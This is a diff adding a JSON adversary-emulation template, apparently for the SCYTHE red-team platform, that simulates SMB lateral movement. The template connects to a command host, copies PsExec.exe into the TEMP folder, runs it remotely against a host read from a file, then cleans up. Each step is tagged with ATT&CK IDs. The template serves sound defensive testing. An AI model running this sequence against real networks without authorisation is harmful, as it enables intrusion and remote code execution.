@@ -1,0 +1,89 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "T1021.002 Remote Services: SMB/Windows Admin Shares",
+        "display_name": "T1021_002-RemoteServices-SMB",
+        "name": "T1021_002-RemoteServices-SMB",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"192.168.148.10:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -c type C:\\emulations\\lateral.txt",
+                "rtags": [],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -c $env:TEMP",
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "depends_on_actions": "{\"templateString\":\"--src VFS:/shared/tools/PsExec.exe --dest $(^).response[\\\"result\\\"].strip(\\\\\\\"\\\\\\\\r\\\\\\\\n\\\\\\\").strip(\\\\\\\"\\\\\\\\n\\\\\\\")\\\\PsExec.exe\",\"dependsOnSteps\":[{\"step\":3,\"index\":44,\"xrand\":\"ff5bb9125adc6d1ada80093d324e8404\"}]}",
+                "module": "downloader",
+                "request": "--src VFS:/shared/tools/PsExec.exe --dest $(3).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\PsExec.exe",
+                "rtags": [
+                    "att&ck-technique:T1570"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": "{\"templateString\":\"powershell -c Start-Process -FilePath $(^).response[\\\"result\\\"].strip(\\\\\\\"\\\\\\\\r\\\\\\\\n\\\\\\\").strip(\\\\\\\"\\\\\\\\n\\\\\\\")\\\\PsExec.exe -ArgumentList \\\\\\\"-accepteula \\\\\\\\$(^).response[\\\"result\\\"].strip(\\\\\\\"\\\\\\\\r\\\\\\\\n\\\\\\\").strip(\\\\\\\"\\\\\\\\n\\\\\\\") ipconfig\\\\\\\" -ErrorAction SilentlyContinue -Wait -NoNewWindow\",\"dependsOnSteps\":[{\"step\":3,\"index\":40,\"xrand\":\"ff5bb9125adc6d1ada80093d324e8404\"},{\"step\":2,\"index\":138,\"xrand\":\"d0930453b054be024e11dc24cb4ec25d\"}]}",
+                "module": "run",
+                "request": "powershell -c Start-Process -FilePath $(3).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\PsExec.exe -ArgumentList \\\"-accepteula \\\\$(2).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\") ipconfig\\\" -ErrorAction SilentlyContinue -Wait -NoNewWindow",
+                "rtags": [
+                    "att&ck-technique:T1569.002"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "depends_on_actions": "{\"templateString\":\"powershell del $(^).response[\\\"result\\\"].strip(\\\\\\\"\\\\\\\\r\\\\\\\\n\\\\\\\").strip(\\\\\\\"\\\\\\\\n\\\\\\\")\\\\PsExec.exe\",\"dependsOnSteps\":[{\"step\":3,\"index\":17,\"xrand\":\"ff5bb9125adc6d1ada80093d324e8404\"}]}",
+                "module": "run",
+                "request": "powershell del $(3).response[\"result\"].strip(\\\"\\\\r\\\\n\\\").strip(\\\"\\\\n\\\")\\PsExec.exe",
+                "rtags": [
+                    "att&ck-technique:T1569.002"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
